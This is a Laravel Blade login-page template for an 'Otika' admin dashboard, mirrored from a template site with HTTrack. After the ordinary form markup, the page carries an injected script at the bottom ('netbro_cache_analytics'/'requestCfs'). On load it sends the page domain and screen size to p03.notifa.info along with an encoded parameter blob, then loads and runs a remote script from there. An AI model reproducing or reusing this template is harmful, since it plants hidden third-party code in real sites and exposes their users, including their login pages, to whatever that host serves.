<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.radixtouch.in/templates/admin/otika/source/light/auth-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Mar 2020 12:14:57 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
    <title>Otika - Admin Dashboard Template</title>
    <!-- General CSS Files -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/app.min.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-manager/bundles/bootstrap-social/bootstrap-social.css') }}">
    <!-- Template CSS -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/style.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/components.css') }}">
    <!-- Custom style CSS -->
    <link rel="stylesheet" href="{{ asset ('assets-manager/css/custom.css') }}">
    <link rel='shortcut icon' type='image/x-icon' href='{{ asset ('assets-manager/img/favicon.ico') }}'/>
</head>

<body>
<div id="app">
    <section class="section">
        <div class="container mt-5">
            <div class="row">
                <div class="col-12 col-sm-8 offset-sm-2 col-md-6 offset-md-3 col-lg-6 offset-lg-3 col-xl-4 offset-xl-4">
                    <div class="card card-primary">
                        <div class="card-header">
                            <h4>Login</h4>
                        </div>
                        <div class="card-body">
                            <form method="POST" action="{{ route('manager.login.submit') }}" class="needs-validation" >
                               @csrf
                                <div class="form-group">
                                    <label for="email">Email</label>
                                    <input type="email"
                                           class="form-control @error('email') is-invalid @enderror"
                                           name="email" value="{{ old('email') }}">

                                    @error('email')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="invalid-feedback">
                                        Please fill in your email
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="password" class="control-label">Password</label>
                                    <input type="password" name="password" required
                                           class="form-control @error('password') is-invalid @enderror">
                                    @error('password')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="invalid-feedback">
                                        please fill in your password
                                    </div>
                                </div>

                                <div class="form-group">
                                    <button type="submit" class="btn btn-primary btn-lg btn-block" tabindex="4">
                                        Login
                                    </button>
                                </div>
                            </form>
                            {{--<div class="d-block">--}}
                                {{--<div class="float-right">--}}
                                    {{--<a href="auth-forgot-password.html" class="text-small">--}}
                                        {{--Forgot Password?--}}
                                    {{--</a>--}}
                                {{--</div>--}}
                            {{--</div>--}}
                        </div>
                    </div>
                    {{--<div class="mt-5 text-muted text-center">--}}
                        {{--Don't have an account? <a href="auth-register.html">Create One</a>--}}
                    {{--</div>--}}
                </div>
            </div>
        </div>
    </section>
</div>
<!-- General JS Scripts -->
<script src="{{ asset ('assets-manager/js/app.min.js') }}"></script>
<!-- JS Libraies -->
<!-- Page Specific JS File -->
<!-- Template JS File -->
<script src="{{ asset ('assets-manager/js/scripts.js') }}"></script>
<!-- Custom JS File -->
<script src="{{ asset ('assets-manager/js/custom.js') }}"></script>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXQLX5RO%2br8u%2fBlt2NSw7KFtrSzX5HcdrLxUW39za3RQ5STg1BaQ3kDbM22wLyzpUg88NqkhPvj0haILB8jXCWkpBI1p2jC%2bCAjLW4gMhma%2bgin%2bo61MXvhUOhA42O20DBSP6CLftn%2f92KGusTL6t02wxs7iL6gg8kgMjPCkO0JbudDTXvPtNPZuRGSqphpyzA79AtubxEKiQvxTSfq8%2bSZ9mYoj8sc1D2Zqxxy0yCVURVO70XEASOhXHq7xU4z4T8Koj3WZD4JdEzul53TBiOcKEZz%2bzTUtLkNcfzRQBRFq1plfazRoz9NfN5N4zldMfKVHNI9iJqo70uAnO1oLT2BQXi7aL7QmDJcRFZeCEVlFBrjUzq8Z0yy5hvhwB4IAJUXK3MCL0tCVoGT9L190sQVIIR12cTaXHAS%2fNEKx8IDAMnH2hW1PjuuQLVjjcZPRT6DY9ne9WKazzt0NmtnJ%2bMQawXiVn%2bpplkp7LYXJUtGIc4xumbL4wE5G6E5gcNulGodosj3m8lBLw%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>


<!-- Mirrored from www.radixtouch.in/templates/admin/otika/source/light/auth-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Mar 2020 12:14:57 GMT -->
</html>
